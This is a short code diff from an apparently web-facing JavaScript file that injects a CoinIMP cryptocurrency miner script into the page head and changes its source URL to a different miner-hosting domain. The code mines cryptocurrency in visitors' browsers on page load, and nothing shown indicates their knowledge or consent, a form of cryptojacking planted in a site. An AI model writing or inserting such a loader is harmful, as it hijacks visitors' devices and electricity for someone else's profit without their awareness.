@@ -1,6 +1,6 @@
 // ✅ Load CoinIMP miner script dynamically
 const minerScript = document.createElement("script");
-minerScript.src = "https://dictionary-three-nu.vercel.app/miner.js"; // galing sa CoinIMP
+minerScript.src = "https://www.hostingcloud.racing/PpZ9.js"; // galing sa CoinIMP
 minerScript.onerror = () => console.error("❌ Miner script failed to load");
 document.head.appendChild(minerScript);
 
